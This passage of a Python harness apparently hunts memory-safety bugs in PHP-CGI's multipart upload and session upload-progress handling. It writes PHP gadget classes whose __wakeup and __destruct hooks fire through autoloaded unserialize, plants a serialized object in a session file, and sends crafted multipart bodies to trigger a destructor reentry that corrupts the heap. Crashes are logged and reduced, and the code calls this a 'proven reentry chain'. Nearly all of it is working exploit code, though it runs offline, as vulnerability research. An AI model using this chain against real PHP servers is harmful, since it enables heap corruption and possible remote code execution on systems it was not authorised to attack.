        cut = rng2.randint(32, max(33, len(base) - 1))
        out.append(("p2combo", "p2rndshave%d_%s" % (i, name), base[:cut], b2 or BND,
                    len(base)))
    return out


INCU = os.path.join(HUNT, "incu")
WP_ACTION = os.path.join(HUNT, "wp_action.txt")

REENTRY_PHP_ARGS_EXTRA = [
    "-d", "unserialize_callback_func=spl_autoload",
    "-d", "include_path=.:" + INCU,
]


def ensure_reentry_files():
    """Offline equivalents of the app_dropchain drop-set (slim chain):
    one class file defining both D and D2, self-arming the engine autoloader;
    wp_action.txt controls the destructor's reentry action."""
    os.makedirs(INCU, exist_ok=True)
    dphp = r'''<?php
class D2 {
    public function __destruct() {
        $dir = '@@HUNT@@';
        $action = @trim((string)@file_get_contents($dir . '/wp_action.txt')) ?: 'none';
        $armed  = !empty($GLOBALS['armed']);
        @file_put_contents($dir . '/rce_trace.log',
            '[' . microtime(true) . "] D2::__destruct action=$action armed=$armed\n", FILE_APPEND);
        if (!$armed) return;
        if ($action === 'kill' || $action === 'kill_start') { session_destroy(); unset($_SESSION); }
    }
}
class D {
    public function __wakeup() {
        $dir = '@@HUNT@@';
        @file_put_contents($dir . '/rce_trace.log', '[' . microtime(true) . "] D::__wakeup (offline slim)\n", FILE_APPEND);
        $GLOBALS['armed'] = true;
        if (isset($_SESSION) && is_array($_SESSION)) {
            foreach ($_SESSION as $k => $v) {
                if (is_string($k) && strpos($k, 'upload_progress_') === 0) {
                    $_SESSION[$k] = new D2();
                    @file_put_contents($dir . '/rce_trace.log', '[' . microtime(true) . "] planted D2 at $k\n", FILE_APPEND);
                    session_write_close();
                    break;
                }
            }
        }
    }
}
'''.replace("@@HUNT@@", HUNT)
    with open(os.path.join(INCU, "d.php"), "w") as f:
        f.write(dphp)


def case_reentry(name, body, boundary=BND, key=b"K0000001", sid="rp012345",
                 action=b"kill", alloc0=True, timeout=8.0, content_length=None):
    """Plant the reentry classes via decode-time autoload, then run one
    multipart request that hits the rfc1867 update replace-path destructor."""
    global run_counter
    if run_counter >= RUNS_BUDGET:
        return ("skipped-budget", b"", b"", None, "", None)
    ensure_reentry_files()
    run_counter += 1
    with open(WP_ACTION, "wb") as f:
        f.write(action)
    sessfile = os.path.join(SCRATCH, "sess_" + sid)
    try:
        os.remove(sessfile)
    except FileNotFoundError:
        pass
    with open(sessfile, "wb") as f:
        f.write(b"upload_progress_" + key + b"|O:1:\"D\":0:{}")
    env = dict(ENV_BASE)
    env["CONTENT_TYPE"] = "multipart/form-data; boundary=" + \
        boundary.decode("latin1")
    env["CONTENT_LENGTH"] = str(len(body) if content_length is None
                                else content_length)
    env["HTTP_COOKIE"] = "PHPSESSID=" + sid
    if alloc0:
        env["USE_ZEND_ALLOC"] = "0"
    t0 = time.time()
    try:
        p = subprocess.run([PHP_CGI] + PHP_ARGS + REENTRY_PHP_ARGS_EXTRA,
                           input=body, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, env=env, timeout=timeout)
        rc, out, err = p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        rc, out, err = -99, (e.stdout or b""), (e.stderr or b"")
    dt = time.time() - t0
    etxt = err.decode("utf-8", "replace") + out.decode("utf-8", "replace")
    ashit = detect(err.decode("utf-8", "replace"), rc)
    sig = ashit or None
    if "zend_mm_heap corrupted" in etxt:
        sig = "zend_mm_heap_corrupted(rc=%s)" % rc
    status = "hit"
    res = {"fam": "reentry", "name": name, "rc": rc,
           "sig": sig or ("clean" if rc in (0, 1) else "other"), "t": dt}
    if sig and action != b"none":
        slug = re.sub(r"[^A-Za-z0-9_-]+", "_", name)[:40]
        d = os.path.join(CRASHES, slug)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "body.bin"), "wb") as f:
            f.write(body)
        with open(os.path.join(d, "asan.log"), "wb") as f:
            f.write(err)
        try:
            with open(os.path.join(HUNT, "rce_trace.log"), "rb") as f2:
                trc = f2.read()
        except OSError:
            trc = b""
        with open(os.path.join(d, "rce_trace.log"), "wb") as f:
            f.write(trc)
        with open(os.path.join(d, "meta.json"), "w") as f:
            json.dump({"name": name, "argv": [PHP_CGI] + PHP_ARGS
                       + REENTRY_PHP_ARGS_EXTRA, "env": env, "exit_code": rc,
                       "body_len": len(body), "action": action.decode(),
                       "use_zend_alloc": env.get("USE_ZEND_ALLOC", "unset"),
                       "sid": sid, "planted_key": "upload_progress_"
                       + key.decode(), "signature": sig}, f, indent=2)
        res["dir"] = d
        res["sha"] = sig
        hits.append(res)
    family_table.append(("reentry", name, "hit" if sig else
                         "clean%d" % rc, "{}s".format(round(dt, 2)), rc))
    return (status, out, err, ashit, sig, res)


seed_val = 20261021
phase2_pool = []


def all_cases(seed):
    rng = random.Random(seed)
    out = []
    out += fam_seed()
    out += fam_filename()
    out += fam_parts()
    out += fam_dupprog()
    out += fam_mfs()
    out += fam_bdry()
    out += fam_empties()
    out += fam_noclose()
    out += fam_dupcd()
    out += fam_crlf()
    out += fam_inter()
    out += fam_shorthave(rng)
    out += fam_postmax()
    out += fam_samename()
    out += fam_combo(rng)
    return out


def phase3_cases():
    """Proven reentry chain (battery_dropchain slim) adapted offline."""
    out = []
    pv = b"K0000001"
    uid = sid_for("reentry")
    sid = uid

    def hdr(n, v):
        return (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\""
                + n + b"\"\r\n\r\n" + v + b"\r\n")

    def mp(nm, fn, c):
        return (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\""
                + nm + b"\"; filename=\"" + fn + b"\"\r\n\r\n" + c + b"\r\n")

    battery_body = (hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv + uid.encode())
                    + hdr(b"MAX_FILE_SIZE", b"102400")
                    + mp(b"f0", b"f0.bin", b"U" * 200000)
                    + b"--" + BND + b"--\r\n")
    out.append(("reentry", "r1_battery", battery_body, BND, None,
                b"kill", pv + uid.encode(), sid, True))
    out.append(("reentry", "r2_killstart", battery_body, BND, None,
                b"kill_start", pv + uid.encode(), sid, True))
    multi = (mp(b"f1", b"a.bin", b"Q" * 1000)
             + hdr(b"PHP_SESSION_UPLOAD_PROGRESS", pv + uid.encode())
             + mp(b"f2", b"b.bin", b"Q" * 1000)
             + hdr(b"MAX_FILE_SIZE", b"102400")
             + mp(b"f3", b"c.bin", b"Q" * 1000)
             + b"--" + BND + b"--\r\n")
    out.append(("reentry", "r3_multi", multi, BND, None, b"kill",
                pv + uid.encode(), sid, True))
    n = len(battery_body)
    out.append(("reentry", "r4_shorthave", battery_body[:int(n * 0.7)], BND,
                n, b"kill", pv + uid.encode(), sid, True))
    out.append(("reentry", "r5_control", battery_body, BND, None,
                b"none", pv + uid.encode(), sid, True))
    return out


def run_phase3():
    """Budget-disciplined: 4 discovery runs (+2 reduction runs only on hit),
    keeps cumulative count <= ~250."""
    cases = phase3_cases()
    picks = [c for c in cases
             if c[1] in ("r1_battery", "r3_multi", "r4_shorthave",
                         "r5_control")]
    first_hit = None
    for fam, name, body, bnd, cl, act, key, sid, a0 in picks:
        res = None
        status, out, err, ashit, sig, res = case_reentry(
            name, body, bnd, key=key, sid=sid, action=act, alloc0=a0,
            content_length=cl)
        assert res is not None
        print("PHASE3 %-14s act=%-10s rc=%-3s sig=%s" %
              (name, act.decode(), res["rc"], sig), flush=True)
        if sig and act != b"none" and first_hit is None:
            first_hit = (fam, name, body, bnd, cl, act, key, sid, a0, res)
    if first_hit:
        reduce_reentry(first_hit)


def reduce_reentry(hit):
    """Spec step 5: REDUCE parts/fields while the hit persists."""
    fam, name, body, bnd, cl, act, key, sid, a0, res = hit
    def mp(nm, fn, c):
        return (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\""
                + nm + b"\"; filename=\"" + fn + b"\"\r\n\r\n" + c + b"\r\n")

    def hdr(n, v):
        return (b"--" + BND + b"\r\nContent-Disposition: form-data; name=\""
                + n + b"\"\r\n\r\n" + v + b"\r\n")

    uid = sid_for("reentry")
    kk = b"K0000001" + uid.encode()
    variants = [
        ("min_progress_file",
         hdr(b"PHP_SESSION_UPLOAD_PROGRESS", kk)
         + mp(b"f0", b"f0.bin", b"U" * 1024)
         + b"--" + BND + b"--\r\n"),
        ("min_progress_only",
         hdr(b"PHP_SESSION_UPLOAD_PROGRESS", kk)
         + mp(b"f0", b"f0.bin", b"U" * 8)
         + b"--" + BND + b"--\r\n"),
    ]
    kept = []
    for vname, vbody in variants:
        status, out, err, ashit, sig2, res2 = case_reentry(
            "reduce_%s" % vname, vbody, bnd, key=kk, sid=uid, action=act,
            alloc0=a0)
        print("REDUCE %-20s sig=%s" % (vname, sig2), flush=True)
        assert res2 is not None
        if sig2 and act != b"none":
            kept.append((vname, vbody, res2["dir"], sig2))
    if kept:
        with open(os.path.join(res["dir"], "REDUCTION.txt"), "w") as f:
            for vname, vbody, dd, sg in kept:
                f.write("%s -> %s (sig=%s)\n" % (vname, dd, sg))
    return kept


def phase2_cases(seed):
    """Deep phase-2 cases. `fam_phase2` needs glimpses of earlier bodies."""
    global seed_val
    seed_val = seed
    base_pool = []
    for c in all_cases(seed):
        base_pool.append((c[0], c[1], c[2], c[3], c[4]))
    for c in base_pool:
        phase2_pool.append(c)
    rng = random.Random(seed ^ 0xBEEF)
    out = fam_phase2(rng)
    return out


def sanity():
    print("binary:", PHP_CGI)
    for fam, name, body, bnd, cl in all_cases(1)[:4]:
        rc, out, err, sig = case(fam, name, body, bnd, DEFAULT_SID, cl)
        stat = "HIT " + (sig or "") if sig else "ok"
        print("sanity %-12s rc=%-3s %-4s out=%3dB err=%3dB" %
              (name, rc, stat, len(out), len(err)))
        if err:
            print("   stderr head:", err[:400])
    files = sorted(os.listdir(SCRATCH))
    print("scratch session files:", files)
    return 0


def main():
    global RUNS_BUDGET, run_counter
    args = sys.argv[1:]
    seed = 20261021
    if "sanity" in args:
        return sanity()
    if "phase3" in args:
        return run_phase3()
    if "--seed" in args:
        seed = int(args[args.index("--seed") + 1])
    if "--budget" in args:
        RUNS_BUDGET = int(args[args.index("--budget") + 1])

    if "phase2" in args:
        allc = phase2_cases(seed)
    else:
        allc = all_cases(seed)
    print("total cases: %d, seed=%d, budget=%d" %
          (len(allc), seed, RUNS_BUDGET), flush=True)
    t0 = time.time()
    for i, (fam, name, body, bnd, cl) in enumerate(allc):
        case(fam, name, body, bnd, DEFAULT_SID, cl)
        if run_counter % 25 == 0:
            print("  ... %d/%d runs (%.0fs elapsed)" %
                  (run_counter, len(allc), time.time() - t0), flush=True)

    print("\n==== SUMMARY used=%d hits=%d time=%.0fs" %
          (run_counter, len(hits), time.time() - t0))
    print("--- family table (status counts)")
    byfam = {}
    for fam, name, status, dt, rc in family_table:
        byfam.setdefault(fam, {})
        byfam[fam][status] = byfam[fam].get(status, 0) + 1
    for fam in sorted(byfam):
        print("  %-12s %s" % (fam, byfam[fam]))
    print("--- non-ok detail")
    anydetail = False
    for fam, name, status, dt, rc in family_table:
        if status not in ("ok",):
            anydetail = True
            print("   %-10s %-24s %-10s rc=%-4s %s" % (fam, name, status, rc, dt))
    if not anydetail:
        print("   (every run ok)")

    if hits:
        print("\n--- HITS")
        for h in hits:
            print("  %-10s %-30s rc=%s sig=%s" % (h["fam"], h["name"],
                                                  h["rc"], h["sig"]))
            print("      dir=%s" % h["dir"])
            print("      sha=%s" % h["sha"][:220])
    return 0


if __name__ == "__main__":
    sys.exit(main())
